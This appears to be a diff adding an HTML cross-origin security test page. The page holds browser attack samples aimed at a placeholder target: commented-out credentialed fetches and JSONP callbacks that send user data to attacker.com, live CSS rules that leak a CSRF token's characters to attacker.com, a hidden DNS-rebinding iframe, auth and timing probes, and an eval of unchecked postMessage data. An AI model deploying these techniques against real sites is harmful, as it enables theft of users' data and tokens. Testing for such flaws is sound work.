@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Cross-Origin Security Test</title>
+    <style>body { font-family: Arial; max-width: 800px; margin: 50px auto; padding: 20px; }</style>
+</head>
+<body>
+    <h1>Cross-Origin Test Page</h1>
+    
+    <!-- CORS misconfiguration test -->
+    <script>
+        // fetch('https://api.target.com/user-data', {
+        //     credentials: 'include'
+        // }).then(r => r.json()).then(data => {
+        //     fetch('https://attacker.com/exfil?data=' + JSON.stringify(data));
+        // });
+    </script>
+    
+    <!-- JSONP endpoint abuse -->
+    <script src="https://api.target.com/user?callback=stealData"></script>
+    <script>
+        // function stealData(data) { fetch('https://attacker.com/?d=' + btoa(JSON.stringify(data))); }
+    </script>
+    
+    <!-- Image size-based data extraction -->
+    <img src="https://api.target.com/check-auth" 
+         onload="this.width === 1 ? loggedIn() : loggedOut()">
+    
+    <!-- Timing attack -->
+    <script>
+        // const start = performance.now();
+        // fetch('https://api.target.com/search?q=existing_user').then(() => {
+        //     const time = performance.now() - start;
+        //     // Different timing reveals if user exists
+        // });
+    </script>
+    
+    <!-- PostMessage without origin check -->
+    <script>
+        // window.addEventListener('message', (e) => {
+        //     // Missing: if (e.origin !== 'https://trusted.com') return;
+        //     eval(e.data); // DANGEROUS
+        // });
+    </script>
+    
+    <!-- DNS rebinding preparation -->
+    <iframe src="http://attacker-controlled-domain.com/rebind" style="display:none"></iframe>
+    
+    <!-- WebRTC IP leak -->
+    <script>
+        // RTCPeerConnection can leak internal IPs
+        // const pc = new RTCPeerConnection({iceServers: []});
+        // pc.createDataChannel('');
+        // pc.onicecandidate = e => {
+        //     if (e.candidate) console.log(e.candidate.candidate);
+        // };
+    </script>
+    
+    <!-- PDF with embedded JavaScript -->
+    <embed src="data:application/pdf;base64,JVBERi0xLjQK..." width="1" height="1">
+    
+    <!-- Font-face CORS -->
+    <style>
+        @font-face {
+            font-family: 'Probe';
+            src: url('https://internal.target.com/fonts/main.woff');
+        }
+    </style>
+    <script>
+        // document.fonts.load('16px Probe').then(() => {
+        //     // Font loaded = user is authenticated
+        // });
+    </script>
+    
+    <!-- CSRF Token extraction via CSS -->
+    <style>
+        input[name="csrf_token"][value^="a"] { background: url(https://attacker.com/exfil?char=a); }
+        input[name="csrf_token"][value^="b"] { background: url(https://attacker.com/exfil?char=b); }
+    </style>
+    
+</body>
+</html>
